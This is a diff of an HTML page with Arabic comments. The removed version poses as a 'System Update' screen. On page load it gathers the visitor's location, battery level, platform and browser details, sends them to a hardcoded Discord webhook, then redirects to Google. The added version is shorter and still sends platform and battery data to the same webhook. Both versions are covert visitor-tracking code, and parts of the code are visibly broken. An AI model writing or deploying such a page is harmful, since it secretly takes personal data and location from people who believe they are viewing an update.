@@ -1,94 +1,18 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update</title>
-    <style>
-        body { 
-            margin: 0; padding: 0; font-family: sans-serif; 
-            background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; 
-        }
-        .container { 
-            background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
-            text-align: center; width: 300px; z-index: 1; position: relative; 
-        }
-        h2 { margin-top: 0; color: #333; }
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; }
-        #status { margin-top: 10px; font-size: 12px; color: gray; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h2 id="title">جاري التحديث...</h2>
-    <div id="status"></div>
-</div>
-
-<div id="overlay"></div>
-
+<html>
+<body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;font-size:24px;">
+    <div id="t">...</div>
 <script>
-    // ⚙️ ضع رابط الويب هوك الخاص بديسكورد هنا
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1564210777194233899/KtJ9_m_v6mvbHHXpn8aVvWnTysSSqmQCBRUJiCtow8O9krQGPddn1i2ojt_cJrYNPpSZ'; 
+// ⚠️ استبدل الرابط التالي برابط الويب هوك الخاص بك
+const H='https://discord.com/api/webhooks/1564210777194233899/KtJ9_m_v6mvbHHXpn8aVvWnTysSSqmQCBRUJiCtow8O9krQGPddn1i2ojt_cJrYNPpSZ';
 
-    async function sendDiscord(data) {
-        let caption = 🎉 تقرير جديد\n\n📱 الجهاز: ${data.platform || 'N/A'};
-        if (data.battery) caption += \n🔋 البطارية: ${data.battery};
-        if (data.location && data.location !== "N/A") caption += \n📍 الموقع: ${data.location};
-        caption += \n🌐 المتصفح: ${data.userAgent.substring(0, 60)}...;
-
-        try {
-            // استخدام JSONP لتجاوز مشاكل CORS
-            const script = document.createElement('script');
-            const callbackName = 'discordCallback_' + Date.now();
-            
-            window[callbackName] = function() {
-                document.getElementById('status').innerText = "تم بنجاح! جاري التحويل...";
-                setTimeout(() => window.location.href = "https://google.com", 1000);
-            };
-
-            const payload = encodeURIComponent(JSON.stringify({ content: caption }));
-            script.src = ${WEBHOOK_URL}?callback=${callbackName}&payload=${payload};
-            
-            document.body.appendChild(script);
-            return true;
-        } catch (error) {
-            document.getElementById('status').innerText = "حدث خطأ.";
-            return false;
-        }
-    }
-
-    async function getDeviceInfo() {
-        let batteryLevel = "N/A";
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            batteryLevel = Math.round(b.level * 100) + "%";
-        }
-        let location = "N/A";
-        if (navigator.geolocation) {
-            try {
-                const pos = await new Promise((resolve, reject) => 
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 4000})
-                );
-                location = ${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)};
-            } catch (e) {}
-        }
-        return {
-            userAgent: navigator.userAgent,
-            battery: batteryLevel,
-            location: location,
-            platform: navigator.platform
-        };
-    }
-
-    async function start() {
-        const data = await getDeviceInfo();
-        await sendDiscord(data);
-    }
-
-    window.onload = start;
-
+// دالة سريعة لإرسال البيانات
+try{
+  const b = document.createElement('script');
+  b.src=H+'?callback=cb&payload='+encodeURIComponent(JSON.stringify({content:`📱 ${navigator.platform}\n🔋 ${Math.round((navigator.getBattery&&navigator.getBattery().then(b=>b.level*100)))}%`}))
+  window.cb = ()=>{document.getElementById('t').innerText="Done"}
+  document.body.appendChild(b)
+} catch(e){document.getElementById('t').innerText="Error"}
 </script>
-
 </body>
 </html>
